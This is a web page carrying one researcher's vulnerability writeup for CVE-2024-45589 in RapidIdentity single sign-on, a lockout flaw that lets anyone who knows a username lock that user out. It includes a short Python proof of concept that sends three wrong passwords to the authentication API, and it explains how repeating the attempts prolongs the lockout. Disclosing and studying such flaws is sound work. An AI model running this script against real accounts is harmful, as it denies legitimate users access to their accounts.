<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Writeup for CVE-2024-45589 (RidLocker) | CVE-2024-45589</title>
<meta name="generator" content="Jekyll v3.10.0" />
<meta property="og:title" content="Writeup for CVE-2024-45589 (RidLocker)" />
<meta property="og:locale" content="en_US" />
<link rel="canonical" href="https://benrogozinski.github.io/CVE-2024-45589/" />
<meta property="og:url" content="https://benrogozinski.github.io/CVE-2024-45589/" />
<meta property="og:site_name" content="CVE-2024-45589" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Writeup for CVE-2024-45589 (RidLocker)" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"WebSite","headline":"Writeup for CVE-2024-45589 (RidLocker)","name":"CVE-2024-45589","url":"https://benrogozinski.github.io/CVE-2024-45589/"}</script>
<!-- End Jekyll SEO tag -->

    <link rel="stylesheet" href="/CVE-2024-45589/assets/css/style.css?v=19e4398da1b68a3096c237f7a981a36e2ffe5b7b">
    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->

<!-- Setup Google Analytics -->



<!-- You can set your favicon here -->
<!-- link rel="shortcut icon" type="image/x-icon" href="/CVE-2024-45589/favicon.ico" -->

<!-- end custom head snippets -->

  </head>
  <body>
    <div class="container-lg px-3 my-5 markdown-body">
      
      <h1><a href="https://benrogozinski.github.io/CVE-2024-45589/">CVE-2024-45589</a></h1>
      

      <h1 id="writeup-for-cve-2024-45589-ridlocker">Writeup for CVE-2024-45589 (RidLocker)</h1>

<h4 id="by-ben-rogozinski">By Ben Rogozinski</h4>

<hr />

<h2 id="summary">Summary</h2>

<h4 id="product-vendor">Product vendor:</h4>
<p>Identity Automation (<a href="https://www.identityautomation.com/">https://www.identityautomation.com/</a>)</p>

<h4 id="impacted-versions">Impacted versions:</h4>
<ul>
  <li>Rapididentity LTS &lt;= 2023.0.2</li>
  <li>Rapididentity Cloud &lt;= 2024.08.0</li>
</ul>

<h4 id="description">Description:</h4>
<p>RapidIdentity LTS through 2023.0.2 and Cloud through 2024.08.0 improperly restricts excessive authentication attempts, allowing a remote attacker to cause a denial of service to legitimate users by knowing the usernames of the users they wish to target.</p>

<h2 id="first-encounter">First encounter</h2>

<p>The premise for this exploit was discovered unintentionally. My school district (redacted for privacy reasons) uses Rapididentity for SSO and I noticed that after forgetting my password and inputting the wrong one a few times I could no longer log into my account even with the correct password on any of my devices for a significant period of time. I have a lot of experience with programming so I realized this was a massive oversight, as could potentially allow any remote unauthenticated user, with only the username of a target, to effectively lock users out of their accounts. With continuous use, this could also potentially last for much longer than the default lockout time.</p>

<h2 id="research">Research</h2>

<p>After realizing the potentially devestating effect that this oversight could have on users, I decided to do some more research. After some quick Google searching, I came across the documentation for the API used for authentication in Rapididentity, as well as documentation its default configuration. To my surprise, I found that the default configuration required only 3 incorrect login attempts to lock an account, and that instead of a device-specific lockout, it locked the account globally, as I originally discovered.</p>

<p>After some research into the Rapididentity API, I decided to obtain a copy of the server ISO and do some local testing. After a long headache of getting the server software configured and running in a virtual machine, I was able to start some tests. I first used Python to test the API endpoints I would need to use for simulating a login. After testing the API, I made a short script to simulate 3 incorrect login attempts.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>

<span class="n">api_url</span> <span class="o">=</span> <span class="s">'https://SERVER_DOMAIN/api/rest/authn'</span>
<span class="n">username</span> <span class="o">=</span> <span class="s">'TEST_USER'</span>

<span class="c1"># Session to persist cookies between requests
</span><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">session</span><span class="p">()</span>

<span class="c1"># Get the ID needed for authentication
</span><span class="n">resp_step_one</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">api_url</span><span class="p">)</span>
<span class="n">id_token</span> <span class="o">=</span> <span class="n">resp_step_one</span><span class="p">.</span><span class="n">json</span><span class="p">()[</span><span class="s">'id'</span><span class="p">]</span>

<span class="c1"># POST username to server
</span><span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span>
    <span class="s">'id'</span><span class="p">:</span> <span class="n">id_token</span><span class="p">,</span>
    <span class="s">'type'</span><span class="p">:</span> <span class="s">'username'</span><span class="p">,</span>
    <span class="s">'username'</span><span class="p">:</span> <span class="n">username</span>
<span class="p">})</span>

<span class="c1"># POST "passwords" to server
</span><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
    <span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span>
        <span class="s">'id'</span><span class="p">:</span> <span class="n">id_token</span><span class="p">,</span>
        <span class="s">'type'</span><span class="p">:</span> <span class="s">'password'</span><span class="p">,</span>
        <span class="s">'password'</span><span class="p">:</span> <span class="s">'password123'</span>
    <span class="p">})</span>
</code></pre></div></div>

<p>After running this proof of concept code above on my VM with a test account, I was met with the message <code class="language-plaintext highlighter-rouge">Authentication failed</code>. It had worked. This proves that the login system of Rapididentity could be used by a malicious actor to deny service.</p>

<h2 id="impact">Impact</h2>

<p>Just by knowing the usernames of victims who use Rapididentity for authentication services, a remote attacker could effectively deny service to legitimate users. By submitting incorrect password attempts at regular intervals, this could even be extended to lock users out of their accounts for periods of time far longer than a server would be configured for in a normal scenario.</p>

<h2 id="notes--disclaimers">Notes / Disclaimers</h2>

<ul>
  <li>I am <strong>NOT</strong> responsible for misuse of any information discussed in this writeup or the included proof of concept code. <strong>This is for educational purposes only</strong>.</li>
  <li>I have already attempted to contact Identity Automation reguarding this vulnerability several times in the last few months but have not recieved any replies.</li>
</ul>

<hr />

<h3 id="contact-information">Contact information</h3>
<p>I can be reached at <a href="mailto:ben@benrogo.net">ben@benrogo.net</a> for inquiries about this CVE.</p>


      
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/anchor-js/4.1.0/anchor.min.js" integrity="sha256-lZaRhKri35AyJSypXXs4o6OPFTbTmUoltBbDCbdzegg=" crossorigin="anonymous"></script>
    <script>anchors.add();</script>
  </body>
</html>
